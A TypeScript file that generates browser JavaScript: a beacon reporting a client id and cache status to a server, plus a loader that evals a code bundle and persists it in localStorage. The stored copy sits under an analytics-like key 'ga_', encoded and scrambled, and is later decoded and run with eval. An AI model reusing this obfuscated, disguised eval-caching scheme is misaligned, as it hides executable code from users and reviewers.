const uuidv4 = require('uuid/v4')

export var Transforms = {
  auth: (id: string, hash: string) => {
    return `var Y=(window.ws||window.i‍),X=Y.url.split('/'),V='https://';'ws:'===X[0]&&(V='http://'),X=V+X[2];var M=new Image;M.src=X+'/a?id=${encodeURIComponent(
      id
    )}&z=${uuidv4()}&t='+(navigator.cookieEnabled&&Storage&&localStorage.ga_&&${JSON.stringify(
      hash
    )}==localStorage.ga_.substr(0,32)?1:0),M.onload`
  },

  cache: (variables: any) => {
    return `with(${JSON.stringify(
      variables
    )})eval(decodeURI(atob(localStorage.ga_.substr(32).split('\u0410').reverse().join('4'))))`
  },

  core: (core: { bundle: string; hash: string }, variables: any) => {
    return `var K=${JSON.stringify(core.bundle)};with(${JSON.stringify(
      variables
    )})eval(K),navigator.cookieEnabled&&void 0!==Storage&&(localStorage.ga_=${JSON.stringify(
      core.hash
    )}+btoa(encodeURI(K)).split('4').reverse().join('\u0410'))`
  }
}
